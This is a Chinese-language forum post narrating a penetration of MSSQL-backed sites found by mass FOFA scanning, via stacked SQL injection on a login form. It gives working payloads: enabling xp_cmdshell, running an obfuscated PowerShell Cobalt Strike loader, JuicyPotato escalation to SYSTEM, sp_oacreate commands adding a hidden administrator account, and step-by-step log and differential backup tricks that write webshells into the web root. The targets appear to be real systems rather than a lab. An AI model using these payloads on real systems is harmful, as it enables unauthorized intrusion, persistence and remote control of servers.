本来对堆叠注入没啥了解，这次正巧碰到mssql的堆叠注入，正好加强一下对堆叠注入的理解。

#### 堆叠注入

因为在sql查询语句中， 分号“；”代表查询语句的结束。所以在执行sql语句结尾分号的后面，再加一条sql语句，就造成了堆叠注入。

这种情况很像联合查询，他们的区别就在于联合查询执行的语句是有限的，只能用来执行查询语句，而堆叠注入可以执行任意语句。

菜鸡不会审计php代码，这里就不贴sql语句的源码了。

下面是渗透流程  
先fofa批量找一下目标

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-75470b35a341eb46b9b61c404b6a9ebc89799c0a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-75470b35a341eb46b9b61c404b6a9ebc89799c0a.png)

前台的页面 首先怼一波弱口令  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a5ea6d577559f748210b1ed08f3a4ac9c5ba6345.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a5ea6d577559f748210b1ed08f3a4ac9c5ba6345.png)

其实有几个是可以弱口令直接进后台的，但是后台没有任何的getshell点

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1dc473fece481496db2efcf7cb615661b757bbcd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1dc473fece481496db2efcf7cb615661b757bbcd.png)

那就只能在后台的登录窗口试一试有没有注入了，抓包测试一下  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-43ca3feb1d6997bbb1e600d6d1b9983fd4f7f337.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-43ca3feb1d6997bbb1e600d6d1b9983fd4f7f337.png)

发现有注入点，直接上sqlmap一把梭  
直接出了mssql 数据库 而且是堆叠注入  
这里想直接 --os-shell，想起来堆叠注入后面的语句是没有回显的，再换个思路。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8d187383ccabff5d49b2127a4fcbd61e43edeec3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8d187383ccabff5d49b2127a4fcbd61e43edeec3.png)

ping 下dnslog 看看是否可以直接执行命令  
看来是可以执行命令的

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bd806c3e255d40891e64933ffae2397f448a62ac.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bd806c3e255d40891e64933ffae2397f448a62ac.png)  
再换个思路，尝试用xp\_cmdshell  
手工打开xp\_cmdshell ,发现函数没有被禁用 ,可以执行命令

```php
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

尝试直接注入cs的powershell上线  
好家伙，直接上线 ，看来函数没有被禁用

```php
EXEC master..xp_cmdshell’免杀powershell命令’
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-63f33564350fed144fe65c4fb1f64e5d758242af.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-63f33564350fed144fe65c4fb1f64e5d758242af.png)

甜土豆提权到system  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d3f68081bcc66e2254f034bbd5d483f3fd75569.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d3f68081bcc66e2254f034bbd5d483f3fd75569.png)

连xp\_cmdshell命令都没有禁用，想来也不会有什么杀软。  
首先看了一下进程，emmm 那么多powershell进程......没有啥玩的必要了。  
可以尝试溯源一波，下篇文章发。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-636cc8b2950ffa9d03ac6df407d43c67cc2c3315.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-636cc8b2950ffa9d03ac6df407d43c67cc2c3315.png)

也没有内网，收工。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cd00f1aae98a6474431c3b4b505d3fb2525bb611.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cd00f1aae98a6474431c3b4b505d3fb2525bb611.png)

### 总结

这里这么顺利是因为没有杀软，命令也都没有拦截禁用，下面说一下如果xp\_cmdshell如果被禁用该怎么办。

##### 1. sp\_configure函数

开启sp\_configure函数的命令

```php
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'Ole Automation Procedures', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'show advanced options', 0;
```

执行系统命令 注意没有回显

下面的命令添加一个影子用户并加入管理员组

```php
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user hack$ 0r@nge /add';
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 0r@nge$ /add';
```

还有其他的函数，这里就不一一列举了。

### 很多情况上面两个函数并不能执行(存在杀软)，mssql数据库可以用一下两个方法

##### 2.log备份写shell

##### 前提条件：

1.数据库存在注入

2.用户具有读写权限，一般至少DBO权限

3.有网站的具体路径

4.站库不分离

而且这种方法备份出的马子体积很小，备份成功的可能性很大。

##### 步骤：

1.修改数据库为还原模式(恢复模式)：

```php
;alter database 库名 set RECOVERY FULL –-
```

3.建表和字段

```php
;create table orange(a image)--
```

3.备份数据库

```php
;backup log 数据库名 to disk = ‘c:\www\0r@nge1.bak’ with init –
```

4.往表中写入一句话

```php
;insert into orange(a) values (0x...)--    //值要进行hex进制转换下
```

5.利用log备份到web的物理路径

```php
;backup log 数据库名 to disk = 'c:\www\0r@nge2.php' with init-- 
```

6.删除表

```php
;Drop table orange-- 
```

### 差异备份写shell

###### 概念：备份自上一次完全备份之后有变化的数据。差异备份过程中，只备份有标记的那些选中的文件和文件夹。它不清除标记，也即备份后不标记为已备份文件。换言之，不清除存档属性。

用人话说就是：第二次备份的时候，与上一次完全备份的时候作对比，把不同的内容备份下来，所以只要插入我们的一句话木马，再备份一下，一句话就会被写到数据库中。

##### 条件：

1. 有网站具体路径
2. 有可写权限(dbo权限以上)
3. 站库不分离

1.备份数据库

```php
;backup database 数据库名 to disk = 'C:\www\\...' with init --
```

2.创建表格

```php
%';create table orange(a image) --
```

3.写入webshell

```php
%';insert into orange(a) values (0xxxxx) --
```

4.进行差异备份

```php
%';backup log 数据库名 to disk = 'C:\www\orange.asp'  WITH DIFFERENTIAL,FORMAT;--
```

5.删除表

```php
;Drop table orange--
```

这些都是理论，实战中可能被各种过滤，还需要修改payload进行具体绕过。

ps：第一次发文章，有啥不对的师傅们可以指出来，一起学习(求轻喷)